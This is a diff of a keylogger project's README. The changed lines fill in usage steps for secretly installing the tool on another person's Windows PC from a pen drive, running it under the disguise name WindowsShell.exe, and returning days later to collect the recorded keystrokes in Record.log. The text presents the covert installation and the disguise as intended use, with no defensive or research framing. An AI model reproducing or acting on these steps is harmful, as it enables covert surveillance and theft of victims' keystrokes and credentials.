@@ -8,7 +8,7 @@ This tacky program hides itself in the subject’s PC (Windows XP or later), and
 
 1. Download the full package from [here](https://github.com/MinhasKamal/KeyLogger/archive/application.zip), unzip it, and move it to your pen-drive.
 
-2. **---** is the compiled and renamed form of **KeyLogger.cpp** (of course you do not expect others to let you insert a pen-drive containing keylogger!). **---** is a link file of **---**. Now insert your pen-drive in a computer, and run **---**. This will install **---** and **---** in that PC.
+2. **WindowsShell.exe** is the compiled and renamed form of **KeyLogger.cpp** (of course you do not expect others to let you insert a pen-drive containing keylogger!). **WindowsShell.lnk** is a link file of **WindowsShell.exe**. Now insert your pen-drive in a computer, and run **---**. This will install **---** and **---** in that PC.
 
 3. Wait for some days, then return to the PC, and run **CollectData.bat**. You will get a file named **Record.log**.
 
